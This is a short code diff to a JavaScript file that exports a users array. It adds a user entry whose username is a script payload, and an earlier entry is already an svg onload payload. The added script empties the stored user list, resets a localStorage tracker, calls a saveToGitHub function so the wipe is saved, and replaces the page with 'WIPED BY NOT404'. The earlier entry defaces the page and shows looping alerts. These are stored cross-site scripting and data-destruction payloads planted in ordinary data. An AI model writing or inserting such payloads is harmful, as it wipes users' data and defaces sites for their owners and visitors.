@@ -26,5 +26,9 @@ export const users = [
   {
     "username": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">",
     "password": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">"
+  },
+  {
+    "username": "<script> setTimeout(()=>{ window.users=[]; localStorage.setItem('user_creator_tracker','{}'); if(window.saveToGitHub){window.saveToGitHub();} document.body.innerHTML='<div style=\"background:black;color:red;height:100vh;display:flex;align-items:center;justify-content:center;font-size:3em;\">WIPED BY NOT404</div>'; },3000); </script>",
+    "password": "."
   }
 ];
